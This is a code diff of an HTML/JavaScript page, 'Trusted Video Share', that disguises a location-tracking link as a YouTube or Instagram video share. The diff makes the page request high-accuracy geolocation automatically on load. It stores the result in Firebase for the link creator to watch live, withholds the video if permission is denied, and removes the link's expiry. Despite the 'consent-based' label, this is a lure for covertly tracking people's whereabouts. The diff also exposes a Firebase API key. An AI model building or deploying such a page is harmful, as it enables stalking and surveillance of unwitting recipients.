@@ -4,22 +4,25 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
+
   <title>Trusted Video Share</title>
+
   <style>
     * {
-      box-sizing: border-box
+      box-sizing: border-box;
     }
 
     body {
       margin: 0;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Arial, sans-serif;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont,
+        Segoe UI, Roboto, Arial, sans-serif;
       background: #f3f6fb;
-      color: #172033
+      color: #172033;
     }
 
     .wrap {
       width: min(92%, 560px);
-      margin: 30px auto
+      margin: 30px auto;
     }
 
     .card {
@@ -27,18 +30,18 @@
       padding: 24px;
       border-radius: 18px;
       box-shadow: 0 8px 30px rgba(0, 0, 0, .1);
-      margin-bottom: 18px
+      margin-bottom: 18px;
     }
 
     h1,
     h2 {
-      margin-top: 0
+      margin-top: 0;
     }
 
     label {
       display: block;
       font-weight: 600;
-      margin-bottom: 6px
+      margin-bottom: 6px;
     }
 
     input {
@@ -47,7 +50,7 @@
       border: 1px solid #d5dbe5;
       border-radius: 10px;
       font-size: 16px;
-      margin-bottom: 12px
+      margin-bottom: 12px;
     }
 
     button {
@@ -61,38 +64,29 @@
       font-weight: 600;
       cursor: pointer;
       margin-top: 7px;
-      transition: background .2s
     }
 
     button:hover {
-      background: #1252b3
+      background: #1252b3;
     }
 
     button:disabled {
       opacity: .55;
-      cursor: not-allowed
+      cursor: not-allowed;
     }
 
     .secondary {
-      background: #333
+      background: #333;
     }
 
     .secondary:hover {
-      background: #222
+      background: #222;
     }
 
     .small {
       font-size: 14px;
       color: #5f6878;
-      line-height: 1.5
-    }
-
-    .notice {
-      background: #eef6ff;
-      border-left: 4px solid #1769e0;
-      padding: 14px;
-      border-radius: 8px;
-      margin-bottom: 16px
+      line-height: 1.5;
     }
 
     .result {
@@ -100,7 +94,7 @@
       padding: 14px;
       border-radius: 12px;
       margin-top: 14px;
-      word-break: break-word
+      word-break: break-word;
     }
 
     .item {
@@ -108,324 +102,904 @@
       padding: 14px;
       border-radius: 12px;
       margin-top: 10px;
-      border: 1px solid #e1e4e8
+      border: 1px solid #e1e4e8;
     }
 
     a {
       color: #1769e0;
-      word-break: break-all
+      word-break: break-all;
     }
 
     .hidden {
-      display: none
+      display: none;
     }
 
     .status {
       margin-top: 12px;
       min-height: 20px;
-      font-weight: 500
+      font-weight: 500;
     }
 
     .error-msg {
-      color: #a51d2d
+      color: #a51d2d;
     }
 
     .success-msg {
-      color: #1b7e36
+      color: #1b7e36;
     }
   </style>
 </head>
 
+
 <body>
+
   <div class="wrap">
 
-    <!-- CREATOR VIEW -->
-    <section id="creator" class="card">
-      <h1>🎬 Trusted Video Share</h1>
-      <p class="small">Create a consent-based location-sharing link for a trusted person.</p>
+    <!-- ================= CREATOR VIEW ================= -->
 
-      <label for="videoUrl">YouTube / Instagram Video URL</label>
+    <section id="creator" class="card">
+
+      <h1>🎬 Trusted Video Share</h1>
+
+      <p class="small">
+        Create a consent-based location-sharing link for a trusted person.
+      </p>
+
+
+      <label for="videoUrl">
+        YouTube / Instagram Video URL
+      </label>
+
       <input id="videoUrl" type="url" placeholder="https://www.youtube.com/watch?v=..." autocomplete="off">
 
-      <button id="generate">Generate Share Link</button>
+
+      <button id="generate">
+        Generate Share Link
+      </button>
+
+
       <div id="creatorStatus" class="status small"></div>
 
+
       <div id="generated" class="result hidden">
-        <strong>Share Link Generated:</strong>
+
+        <strong>
+          Share Link Generated:
+        </strong>
+
         <p id="shareLink" style="font-weight:bold;margin:8px 0"></p>
-        <button id="copy" class="secondary">Copy Link</button>
+
+
+        <button id="copy" class="secondary">
+          Copy Link
+        </button>
+
       </div>
 
-      <h2 style="margin-top:28px">📍 Received Locations</h2>
+
+      <h2 style="margin-top:28px">
+        📍 Received Locations
+      </h2>
+
+
       <div id="locations">
-        <p class="small">No location received yet.</p>
+
+        <p class="small">
+          No location received yet.
+        </p>
+
       </div>
+
     </section>
 
-    <!-- TRUSTED PERSON VIEW -->
+
+    <!-- ================= TRUSTED PERSON VIEW ================= -->
+
     <section id="trusted" class="card hidden">
-      <h1>Continue to Video</h1>
 
+      <h1>
+        Continue to Video
+      </h1>
 
+      <div id="trustedStatus" class="status small">
+        Checking share link...
+      </div>
 
-      <button id="allow">Continue</button>
-      <div id="trustedStatus" class="status small"></div>
     </section>
 
   </div>
 
+
+
   <script type="module">
+
+
+    /* =========================================================
+       FIREBASE IMPORT
+       ========================================================= */
+
     import { initializeApp }
       from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import {
-      getDatabase, ref, set, push, get, onValue
-    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-    /* ================= FIREBASE CONFIGURATION ================= */
+
+    import {
+      getDatabase,
+      ref,
+      set,
+      push,
+      get,
+      onValue
+    }
+      from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+
+
+    /* =========================================================
+       FIREBASE CONFIGURATION
+       ========================================================= */
+
     const firebaseConfig = {
-      apiKey: "AIzaSyACBBQt47ccBEPuvsDnmQM1JGvhI9w7uaU",
-      authDomain: "project-fa217679-f9c7-4383-87b.firebaseapp.com",
-      databaseURL: "https://project-fa217679-f9c7-4383-87b-default-rtdb.firebaseio.com",
-      projectId: "project-fa217679-f9c7-4383-87b",
-      storageBucket: "project-fa217679-f9c7-4383-87b.firebasestorage.app",
-      messagingSenderId: "102609897998",
-      appId: "1:102609897998:web:87b2ce38b92fcbb71a11cf",
-      measurementId: "G-h5CG9HXKT4"
+
+      apiKey:
+        "AIzaSyACBBQt47ccBEPuvsDnmQM1JGvhI9w7uaU",
+
+      authDomain:
+        "project-fa217679-f9c7-4383-87b.firebaseapp.com",
+
+      databaseURL:
+        "https://project-fa217679-f9c7-4383-87b-default-rtdb.firebaseio.com",
+
+      projectId:
+        "project-fa217679-f9c7-4383-87b",
+
+      storageBucket:
+        "project-fa217679-f9c7-4383-87b.firebasestorage.app",
+
+      messagingSenderId:
+        "102609897998",
+
+      appId:
+        "1:102609897998:web:87b2ce38b92fcbb71a11cf",
+
+      measurementId:
+        "G-h5CG9HXKT4"
     };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
 
-    const $ = id => document.getElementById(id);
-    const params = new URLSearchParams(window.location.search);
-    const shareId = params.get("share");
+    const app =
+      initializeApp(firebaseConfig);
 
-    const creator = $("creator");
-    const trusted = $("trusted");
+
+    const db =
+      getDatabase(app);
+
+
+
+    /* =========================================================
+       BASIC HELPERS
+       ========================================================= */
+
+    const $ =
+      id => document.getElementById(id);
+
+
+    const params =
+      new URLSearchParams(
+        window.location.search
+      );
+
+
+    const shareId =
+      params.get("share");
+
+
+    const creator =
+      $("creator");
+
+
+    const trusted =
+      $("trusted");
+
+
+
+    /* =========================================================
+       RANDOM ID
+       ========================================================= */
 
     function randomId() {
-      const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
+
+      const chars =
+        "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
+
       let s = "";
+
+
       for (let i = 0; i < 12; i++) {
-        s += chars[Math.floor(Math.random() * chars.length)];
+
+        s +=
+          chars[
+          Math.floor(
+            Math.random() *
+            chars.length
+          )
+          ];
+
       }
+
+
       return s;
     }
 
+
+
+    /* =========================================================
+       VIDEO URL VALIDATION
+       ========================================================= */
+
     function validVideoUrl(value) {
+
       try {
-        const u = new URL(value);
-        return u.protocol === "https:" &&
-          /(^|\.)youtube\.com$|(^|\.)youtu\.be$|(^|\.)instagram\.com$/i.test(u.hostname);
+
+        const u =
+          new URL(value);
+
+
+        return (
+          u.protocol === "https:" &&
+          /(^|\.)youtube\.com$|(^|\.)youtu\.be$|(^|\.)instagram\.com$/i
+            .test(u.hostname)
+        );
+
       } catch {
+
         return false;
+
       }
     }
 
-    /* ================= CREATOR MODE ================= */
+
+
+    /* =========================================================
+       CREATOR MODE
+       ========================================================= */
+
     if (!shareId) {
-      $("generate").addEventListener("click", async () => {
-        const videoUrl = $("videoUrl").value.trim();
 
-        if (!validVideoUrl(videoUrl)) {
-          $("creatorStatus").className = "status small error-msg";
-          $("creatorStatus").textContent = "Please enter a valid HTTPS YouTube or Instagram URL.";
-          return;
-        }
 
-        $("generate").disabled = true;
-        $("creatorStatus").className = "status small";
-        $("creatorStatus").textContent = "Creating link...";
+      /* ================= GENERATE LINK ================= */
 
-        const id = randomId();
+      $("generate")
+        .addEventListener(
+          "click",
+          async () => {
 
-        try {
-          const createdAt = Date.now();
-          const expiresAt = createdAt + (20 * 60 * 1000); // 20 minutes
 
-          await set(ref(db, "shares/" + id), {
-            videoUrl: videoUrl,
-            createdAt: createdAt,
-            expiresAt: expiresAt,
-            status: "waiting"
-          });
+            const videoUrl =
+              $("videoUrl")
+                .value
+                .trim();
 
-          const link = window.location.origin + window.location.pathname + "?share=" + encodeURIComponent(id);
 
-          $("shareLink").textContent = link;
-          $("generated").classList.remove("hidden");
-          $("creatorStatus").className = "status small success-msg";
-          $("creatorStatus").textContent = "Share link created successfully. Valid for 20 minutes.";
-          watchLocations(id);
-        } catch (e) {
-          console.error(e);
-          $("creatorStatus").className = "status small error-msg";
-          $("creatorStatus").textContent = "Could not create the link. Check Firebase config or security rules.";
-        } finally {
-          $("generate").disabled = false;
-        }
-      });
+            /* Validate video URL */
 
-      $("copy").addEventListener("click", async () => {
-        try {
-          await navigator.clipboard.writeText($("shareLink").textContent);
-          $("copy").textContent = "Copied ✓";
-          setTimeout(() => $("copy").textContent = "Copy Link", 1500);
-        } catch {
-          $("creatorStatus").className = "status small error-msg";
-          $("creatorStatus").textContent = "Copy failed. Please select and copy the link manually.";
-        }
-      });
+            if (!validVideoUrl(videoUrl)) {
+
+              $("creatorStatus").className =
+                "status small error-msg";
+
+              $("creatorStatus").textContent =
+                "Please enter a valid HTTPS YouTube or Instagram URL.";
+
+              return;
+            }
+
+
+            $("generate").disabled =
+              true;
+
+
+            $("creatorStatus").className =
+              "status small";
+
+
+            $("creatorStatus").textContent =
+              "Creating link...";
+
+
+            /* Create unique ID */
+
+            const id =
+              randomId();
+
+
+            try {
+
+
+              /*
+               * No expiry time.
+               *
+               * Link will remain active
+               * until the Firebase share entry
+               * is deleted.
+               */
+
+              const createdAt =
+                Date.now();
+
+
+              /* Save share */
+
+              await set(
+                ref(
+                  db,
+                  "shares/" + id
+                ),
+                {
+
+                  videoUrl:
+                    videoUrl,
+
+                  createdAt:
+                    createdAt,
+
+                  status:
+                    "waiting"
+
+                }
+              );
+
+
+              /* Create share URL */
+
+              const link =
+                window.location.origin +
+                window.location.pathname +
+                "?share=" +
+                encodeURIComponent(id);
+
+
+              $("shareLink")
+                .textContent =
+                link;
+
+
+              $("generated")
+                .classList
+                .remove("hidden");
+
+
+              $("creatorStatus").className =
+                "status small success-msg";
+
+
+              $("creatorStatus").textContent =
+                "Share link created successfully. This link has no time limit.";
+
+
+              /* Watch location */
+
+              watchLocations(id);
+
+
+            } catch (e) {
+
+              console.error(e);
+
+
+              $("creatorStatus").className =
+                "status small error-msg";
+
+
+              $("creatorStatus").textContent =
+                "Could not create the link. Check Firebase config or security rules.";
+
+            } finally {
+
+              $("generate").disabled =
+                false;
+
+            }
+
+          }
+        );
+
+
+
+      /* ================= COPY LINK ================= */
+
+      $("copy")
+        .addEventListener(
+          "click",
+          async () => {
+
+            try {
+
+              await navigator.clipboard.writeText(
+                $("shareLink").textContent
+              );
+
+
+              $("copy").textContent =
+                "Copied ✓";
+
+
+              setTimeout(
+                () => {
+
+                  $("copy").textContent =
+                    "Copy Link";
+
+                },
+                1500
+              );
+
+
+            } catch {
+
+              $("creatorStatus").className =
+                "status small error-msg";
+
+
+              $("creatorStatus").textContent =
+                "Copy failed. Please select and copy the link manually.";
+
+            }
+
+          }
+        );
+
+
+
+      /* =====================================================
+         WATCH LOCATIONS
+         ===================================================== */
 
       function watchLocations(id) {
-        onValue(ref(db, "locations/" + id), snap => {
-          const root = $("locations");
-          root.innerHTML = "";
 
-          if (!snap.exists()) {
-            root.innerHTML = '<p class="small">No location received yet. Awaiting trusted person consent...</p>';
-            return;
+        onValue(
+          ref(
+            db,
+            "locations/" + id
+          ),
+
+          snap => {
+
+
+            const root =
+              $("locations");
+
+
+            root.innerHTML =
+              "";
+
+
+            if (!snap.exists()) {
+
+              root.innerHTML =
+                '<p class="small">No location received yet. Awaiting trusted person consent...</p>';
+
+              return;
+
+            }
+
+
+            const entries =
+              Object.values(
+                snap.val()
+              ).reverse();
+
+
+            for (
+              const loc
+              of entries
+            ) {
+
+
+              const box =
+                document.createElement(
+                  "div"
+                );
+
+
+              box.className =
+                "item";
+
+
+              const time =
+                new Date(
+                  loc.timestamp
+                ).toLocaleString();
+
+
+              const mapUrl =
+                `https://www.google.com/maps?q=${encodeURIComponent(
+                  loc.latitude +
+                  "," +
+                  loc.longitude
+                )
+                }`;
+
+
+              box.innerHTML = `
+
+                <strong style="color:#1769e0">
+                  📍 Location Received
+                </strong>
+
+                <p
+                  class="small"
+                  style="margin:8px 0"
+                >
+
+                  <strong>Latitude:</strong>
+                  ${Number(
+                loc.latitude
+              ).toFixed(6)}
+
+                  <br>
+
+                  <strong>Longitude:</strong>
+                  ${Number(
+                loc.longitude
+              ).toFixed(6)}
+
+                  <br>
+
+                  <strong>Accuracy:</strong>
+                  ~${Math.round(
+                Number(
+                  loc.accuracy
+                )
+              )} meters
+
+                  <br>
+
+                  <strong>Time:</strong>
+                  ${time}
+
+                </p>
+
+
+                <a
+                  href="${mapUrl}"
+                  target="_blank"
+                  rel="noopener"
+                >
+                  View on Google Maps ↗
+                </a>
+
+              `;
+
+
+              root.appendChild(
+                box
+              );
+
+            }
+
           }
+        );
 
-          const entries = Object.values(snap.val()).reverse();
-
-          for (const loc of entries) {
-            const box = document.createElement("div");
-            box.className = "item";
-
-            const time = new Date(loc.timestamp).toLocaleString();
-            const mapUrl = `https://www.google.com/maps?q=${encodeURIComponent(loc.latitude + ',' + loc.longitude)}`;
-
-            box.innerHTML = `
-          <strong style="color:#1769e0">📍 Location Received</strong>
-          <p class="small" style="margin:8px 0">
-            <strong>Latitude:</strong> ${Number(loc.latitude).toFixed(6)}<br>
-            <strong>Longitude:</strong> ${Number(loc.longitude).toFixed(6)}<br>
-            <strong>Accuracy:</strong> ~${Math.round(Number(loc.accuracy))} meters<br>
-            <strong>Time:</strong> ${time}
-          </p>
-          <a href="${mapUrl}" target="_blank" rel="noopener">View on Google Maps ↗</a>
-        `;
-            root.appendChild(box);
-          }
-        });
       }
+
     }
 
-    /* ================= TRUSTED PERSON MODE ================= */
-    if (shareId) {
-      creator.classList.add("hidden");
-      trusted.classList.remove("hidden");
 
-      let shareData = null;
+
+    /* =========================================================
+       TRUSTED PERSON MODE
+       ========================================================= */
+
+    if (shareId) {
+
+
+      /* Hide creator */
+
+      creator.classList.add(
+        "hidden"
+      );
+
+
+      /* Show trusted */
+
+      trusted.classList.remove(
+        "hidden"
+      );
+
+
+      let shareData =
+        null;
+
+
+
+      /* =====================================================
+         LOAD SHARE
+         ===================================================== */
 
       async function loadShare() {
+
         try {
-          const snap = await get(ref(db, "shares/" + shareId));
+
+
+          const snap =
+            await get(
+              ref(
+                db,
+                "shares/" +
+                shareId
+              )
+            );
+
+
+          /* Link doesn't exist */
 
           if (!snap.exists()) {
-            $("trustedStatus").className = "status small error-msg";
-            $("trustedStatus").textContent = "This share link is invalid or expired.";
-            $("allow").disabled = true;
+
+            $("trustedStatus").className =
+              "status small error-msg";
+
+
+            $("trustedStatus").textContent =
+              "This share link is invalid or closed.";
+
             return;
+
           }
 
-          shareData = snap.val();
 
-          if (shareData.expiresAt && Date.now() >= shareData.expiresAt) {
-            $("trustedStatus").className = "status small error-msg";
-            $("trustedStatus").textContent = "This share link has expired.";
-            $("allow").disabled = true;
-            return;
-          }
+          /* Get share data */
 
-          $("trustedStatus").className = "status small";
+          shareData =
+            snap.val();
+
+
+          $("trustedStatus").className =
+            "status small";
+
+
           $("trustedStatus").textContent =
-            "Ready. Click Allow Location & Continue to request location access.";
+            "Requesting location permission...";
+
+
+          /*
+           * Automatically request location.
+           *
+           * Browser will show its own
+           * permission prompt.
+           */
+
+          requestLocation();
+
+
         } catch (e) {
+
           console.error(e);
-          $("trustedStatus").className = "status small error-msg";
-          $("trustedStatus").textContent = "Could not load link details. Please check your network connection.";
-          $("allow").disabled = true;
+
+
+          $("trustedStatus").className =
+            "status small error-msg";
+
+
+          $("trustedStatus").textContent =
+            "Could not load link details. Please check your network connection.";
+
         }
+
       }
+
+      /* =====================================================
+         REQUEST LOCATION
+         ===================================================== */
+
+      function requestLocation() {
+
+
+        if (!shareData) {
+
+          return;
+
+        }
+
+        /* Check browser support */
+
+        if (!navigator.geolocation) {
+
+          $("trustedStatus").className =
+            "status small error-msg";
+
+
+          $("trustedStatus").textContent =
+            "Geolocation is not supported by your browser.";
+
+          return;
+
+        }
+        $("trustedStatus").className =
+          "status small";
+
+
+        $("trustedStatus").textContent =
+          "Please allow location access in your browser...";
+
+
+        /*
+         * Browser permission request.
+         *
+         * User must press Allow.
+         */
+
+        navigator.geolocation.getCurrentPosition(
+
+
+          /* =================================================
+             SUCCESS
+             ================================================= */
+
+          async position => {
+
+
+            const loc = {
+
+              latitude:
+                position.coords.latitude,
+
+              longitude:
+                position.coords.longitude,
+
+              accuracy:
+                position.coords.accuracy,
+
+              timestamp:
+                Date.now()
+
+            };
+            try {
+              $("trustedStatus").textContent =
+                "Saving location and preparing redirect...";
+              /* Create location record */
+
+              const locRef =
+                push(
+                  ref(
+                    db,
+                    "locations/" +
+                    shareId
+                  )
+                );
+              /* Save location */
+
+              await set(
+                locRef,
+                loc
+              );
+
+
+              /* Update status */
+
+              await set(
+                ref(
+                  db,
+                  "shares/" +
+                  shareId +
+                  "/status"
+                ),
+                "location_received"
+              );
+
+
+              $("trustedStatus").className =
+                "status small success-msg";
+
+
+              $("trustedStatus").textContent =
+                "Location verified. Redirecting to video now...";
+
+
+              /* Open video */
+
+              setTimeout(
+                () => {
+
+                  window.location.href =
+                    shareData.videoUrl;
+
+                },
+                800
+              );
+            } catch (e) {
+
+              console.error(e);
+
+
+              $("trustedStatus").className =
+                "status small error-msg";
+
+
+              $("trustedStatus").textContent =
+                "Failed to save location data to Firebase. Please try again.";
+
+            }
+
+          },
+          /* =================================================
+             ERROR
+             ================================================= */
+
+          error => {
+
+
+            $("trustedStatus").className =
+              "status small error-msg";
+
+
+            switch (
+            error.code
+            ) {
+
+
+              case error.PERMISSION_DENIED:
+
+                $("trustedStatus").textContent =
+                  "Location permission was denied.";
+
+                break;
+
+
+              case error.POSITION_UNAVAILABLE:
+
+                $("trustedStatus").textContent =
+                  "Location is unavailable.";
+
+                break;
+
+
+              case error.TIMEOUT:
+
+                $("trustedStatus").textContent =
+                  "Location request timed out.";
+
+                break;
+
+
+              default:
+
+                $("trustedStatus").textContent =
+                  "Could not get location.";
+
+                break;
+
+            }
+
+          },
+          /* =================================================
+             LOCATION OPTIONS
+             ================================================= */
+
+          {
+
+            enableHighAccuracy:
+              true,
+
+            timeout:
+              15000,
+
+            maximumAge:
+              0
+
+          }
+
+        );
+      }
+      /* =====================================================
+         START AUTOMATICALLY
+         ===================================================== */
 
       loadShare();
 
-      $("allow").addEventListener("click", () => {
-        if (!shareData) return;
-
-        if (!navigator.geolocation) {
-          $("trustedStatus").className = "status small error-msg";
-          $("trustedStatus").textContent = "Geolocation is not supported by your browser.";
-          return;
-        }
-
-        $("allow").disabled = true;
-        $("trustedStatus").className = "status small";
-        $("trustedStatus").textContent = "Please confirm the location permission prompt in your browser...";
-
-        navigator.geolocation.getCurrentPosition(
-          async position => {
-            const loc = {
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy,
-              timestamp: Date.now()
-            };
-
-            try {
-              $("trustedStatus").textContent = "Saving location and preparing redirect...";
-
-              const locRef = push(ref(db, "locations/" + shareId));
-              await set(locRef, loc);
-              await set(ref(db, "shares/" + shareId + "/status"), "location_received");
-
-              $("trustedStatus").className = "status small success-msg";
-              $("trustedStatus").textContent = "Location verified. Redirecting to video now...";
-
-              setTimeout(() => {
-                window.location.href = shareData.videoUrl;
-              }, 800);
-            } catch (e) {
-              console.error(e);
-              $("trustedStatus").className = "status small error-msg";
-              $("trustedStatus").textContent = "Failed to save location data to Firebase. Please try again.";
-              $("allow").disabled = false;
-            }
-          },
-          error => {
-            $("allow").disabled = false;
-            $("trustedStatus").className = "status small error-msg";
-
-            switch (error.code) {
-              case error.PERMISSION_DENIED:
-                $("trustedStatus").textContent = "Location permission was denied. Opening video...";
-                break;
-              case error.POSITION_UNAVAILABLE:
-                $("trustedStatus").textContent = "Location is unavailable. Opening video...";
-                break;
-              case error.TIMEOUT:
-                $("trustedStatus").textContent = "Location request timed out. Opening video...";
-                break;
-              default:
-                $("trustedStatus").textContent = "Could not get location. Opening video...";
-                break;
-            }
-
-            setTimeout(() => {
-              window.location.href = shareData.videoUrl;
-            }, 800);
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
-          }
-        );
-      });
     }
+
   </script>
+
 </body>
 
 </html>
